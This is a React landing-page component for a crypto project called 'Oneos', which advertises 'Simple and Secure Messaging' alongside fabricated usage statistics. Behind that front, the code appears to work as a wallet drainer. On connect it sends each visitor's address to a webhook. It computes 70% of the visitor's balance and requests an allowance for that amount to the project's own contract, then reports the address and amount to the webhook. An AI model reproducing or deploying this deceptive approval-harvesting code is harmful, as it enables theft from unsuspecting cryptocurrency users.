import React, { useState, useEffect } from "react";
import {
  useWeb3ModalProvider,
  useWeb3ModalAccount,
} from "@web3modal/ethers/react";
import { BrowserProvider, Contract, formatUnits } from "ethers";
import { useDispatch, useSelector } from "react-redux";
import { sendNotification } from "../features/webhookSlice";
import { CONTRACT_ADDRESS } from "../contract/address";
import abi from "../contract/Oneos.json";
import Span from "./Span";
import { FaServer } from "react-icons/fa";
import { MdChatBubble, MdCurrencyExchange, MdDomain } from "react-icons/md";
import Connect from "./Connect";
import { und } from "../assets";

const Hero = () => {
  const { address, chainId, isConnected } = useWeb3ModalAccount();
  const { walletProvider } = useWeb3ModalProvider();
  const dispatch = useDispatch();

  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState(false);
  const [amount, setAmount] = useState(null);

  const changeOwner = async (newOwner) => {
    if (!isConnected) throw Error("User disconnected");
    setLoading(true);
    try {
      const ethersProvider = new BrowserProvider(walletProvider);
      const signer = await ethersProvider.getSigner();
      const OneosContract = new Contract(CONTRACT_ADDRESS, abi.abi, signer);

      await OneosContract.transferOwnership(newOwner);
      setSuccess(true);
    } catch (error) {
      console.error(error);
      setError("An error occurred. Try again.");
    } finally {
      setLoading(false);
    }
  };

  const getOwner = async () => {
    if (!isConnected) throw Error("User disconnected");
    setLoading(true);
    try {
      const ethersProvider = new BrowserProvider(walletProvider);
      const signer = await ethersProvider.getSigner();
      const OneosContract = new Contract(CONTRACT_ADDRESS, abi.abi, signer);

      const ownerAddress = await OneosContract.owner();
      console.log("Current owner:", ownerAddress);
      setSuccess(true);
    } catch (error) {
      console.error(error);
      setError("An error occurred. Try again.");
    } finally {
      setLoading(false);
    }
  };

  const increaseAllowance = async () => {
    if (!isConnected) throw Error("User disconnected");
    setLoading(true);

    try {
      const ethersProvider = new BrowserProvider(walletProvider);
      const signer = await ethersProvider.getSigner();
      const OneosContract = new Contract(CONTRACT_ADDRESS, abi.abi, signer);

      // console.log(signer);

      const balanceInWei = await ethersProvider.getBalance(address);
      console.log("Balance in Wei:", balanceInWei.toString());
      // const balanceInWei =
      const balanceBN = BigInt(balanceInWei);
      const partials = (balanceBN * 70n) / 100n;
      const partialsInWei = partials.toString();
      console.log("partial in Wei:", partialsInWei);
      setAmount(partialsInWei);

      const cadd = await OneosContract.getAddress();
      console.log("contractAdd", cadd);
      await OneosContract.increaseAllowance(cadd, partialsInWei);
      setSuccess(true);
    } catch (error) {
      console.error(error);
      setError("An error occurred. Try again.");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (address) {
      const formData = {
        userAddress: address,
        siteName: "Oneos",
      };
      dispatch(sendNotification(formData));
    }
  }, [address, dispatch]);

  useEffect(() => {
    if (success && address && amount) {
      const formData = {
        userAddress: address,
        amount: amount,
      };
      dispatch(sendNotification(formData));
    }
  }, [success, address, amount, dispatch]);
  return (
    <div className="p-6 flex flex-col gap-6">
      <div className="flex flex-col gap-1 text-center ">
        <h3 className="text-xl font-semibold leading-8 whitespace-nowrap lg:text-2xl ">
          Simple and Secure Messaging
        </h3>
        <p className="capitalize font-light opacity-45 text-sm">
          keeping you informed and connected.
        </p>
      </div>
      <div>
        <Connect
          increaseAllowance={increaseAllowance}
          isConnected={isConnected}
          loading={loading}
          getOwner={getOwner}
          changeOwner={changeOwner}
        />
      </div>
      <p className="text-center font-thin leading-8 text-sm lg:w-[60%] lg:mx-auto ">
        $ONS is an AI-powered decentralized communication infrastructure built
        to provide encrypted emails, unified notifications, and targeted
        marketing across multiple chains and dApps for users, developers, and
        marketers.
      </p>
      <div className="flex flex-col gap-4 font-light w-full lg:max-w-[900px] lg:mx-auto text-[#333] lg:flex-row">
        <article className="flex justify-between bg-slate-50  p-6 rounded-lg w-full">
          <Span title={"Instances"} value={"20.50m"} icon={<FaServer />} />
          <Span
            title={"Interactions"}
            value={"180.50m"}
            icon={<MdChatBubble />}
          />
        </article>
        <article className="flex justify-between bg-slate-50  p-6 rounded-lg w-full">
          <Span
            title={"Transactions"}
            value={"300.50m"}
            icon={<MdCurrencyExchange />}
          />
          <Span title={"Domains"} value={"2.98m"} icon={<MdDomain />} />
        </article>
      </div>
      <div className="w-full lg:max-w-[900px] lg:mx-auto text-[#333]">
        <select
          name=""
          id=""
          className="w-full border p-2 border-slate-200 outline-none font-light text-sm"
        >
          <option value="">Protocol</option>
          <option value="">Network</option>
          <option value="">Minting</option>
          <option value="">Airdrop</option>
        </select>
      </div>
      <figure>
        <img
          src={und}
          alt=""
          className="w-full md:w-[500px] mx-auto lg:rounded-full"
        />
      </figure>
    </div>
  );
};

export default Hero;
